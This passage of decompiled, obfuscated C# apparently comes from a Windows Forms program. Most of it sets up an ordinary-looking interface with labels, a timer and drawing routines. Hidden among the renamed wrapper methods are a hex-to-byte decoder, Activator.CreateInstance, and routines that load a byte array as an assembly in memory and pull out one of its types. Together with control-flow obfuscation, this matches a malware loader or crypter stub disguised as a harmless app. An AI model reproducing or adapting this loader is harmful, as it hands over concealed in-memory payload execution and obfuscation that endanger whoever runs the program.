					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 693542262) ^ -608564382;
					continue;
				case 24u:
					Form1.smethod_64((Control)(object)label2, 9);
					num = (int)(num2 * 601764105) ^ -1679787457;
					continue;
				case 23u:
					num = (int)(num2 * 617244480) ^ -391619704;
					continue;
				case 22u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = ((int)num2 * -872359213) ^ 0x62A06EC7;
					continue;
				case 20u:
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = (int)(num2 * 1436778199) ^ -2113550508;
					continue;
				case 19u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					num = (int)((num2 * 1872077219) ^ 0x5867BDA);
					continue;
				case 18u:
					Form1.smethod_72(timer1, 1000);
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = (int)(num2 * 656376974) ^ -1340319221;
					continue;
				case 17u:
					Form1.smethod_5((Control)(object)this, Color.White);
					num = (int)(num2 * 281911373) ^ -843264428;
					continue;
				case 16u:
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = ((int)num2 * -1148093610) ^ -775523879;
					continue;
				case 15u:
					num = ((int)num2 * -633427005) ^ -924653097;
					continue;
				case 14u:
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = (int)((num2 * 260806779) ^ 0xFBD66B1);
					continue;
				case 13u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					num = (int)(num2 * 440885747) ^ -557860330;
					continue;
				case 12u:
					label2 = Form1.smethod_57();
					label5 = Form1.smethod_57();
					label6 = Form1.smethod_57();
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = (int)((num2 * 1779344957) ^ 0x954E8B8);
					continue;
				case 11u:
					Form1.smethod_64((Control)(object)label1, 8);
					num = (int)((num2 * 580367235) ^ 0x65C9D42E);
					continue;
				case 10u:
					num = ((int)num2 * -1202927078) ^ -913960574;
					continue;
				case 9u:
					num = (int)(num2 * 1288522123) ^ -2092725936;
					continue;
				case 8u:
					num = ((int)num2 * -578064876) ^ 0x3A851D68;
					continue;
				case 7u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = (int)((num2 * 1691151742) ^ 0x3F66DA11);
					continue;
				case 6u:
					num = ((int)num2 * -1658526808) ^ -425064305;
					continue;
				case 5u:
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					num = ((int)num2 * -92818350) ^ -1091257696;
					continue;
				case 4u:
					num = ((int)num2 * -1568665602) ^ -1546781526;
					continue;
				case 3u:
					num = (int)(num2 * 1755371672) ^ -1360035838;
					continue;
				case 1u:
					flag = num3 < 22528;
					num = -1034947882;
					continue;
				case 0u:
					Form1.smethod_64((Control)(object)label6, 13);
					num = (int)(num2 * 1494978966) ^ -2102115033;
					continue;
				default:
					return;
				case 2u:
					break;
				case 21u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = ContextAdd(Level);
		while (true)
		{
			int num = -2106619058;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xECE73B00u) % 4u)
				{
				case 2u:
					PerformTable(q);
					num = ((int)num2 * -973344136) ^ 0x2B571139;
					continue;
				case 1u:
					num = ((int)num2 * -1980189984) ^ 0x30A4CE17;
					continue;
				default:
					return;
				case 0u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = Form1.smethod_94(Form1.smethod_93(), Position);
		while (true)
		{
			int num = 323194385;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x4A506601u) % 3u)
				{
				case 2u:
					goto IL_000e;
				case 0u:
					break;
				default:
					return result;
				}
				break;
				IL_000e:
				num = (int)((num2 * 1287534897) ^ 0x1A6679B1);
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		ComMember = Form1.smethod_95(Q3)[24];
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
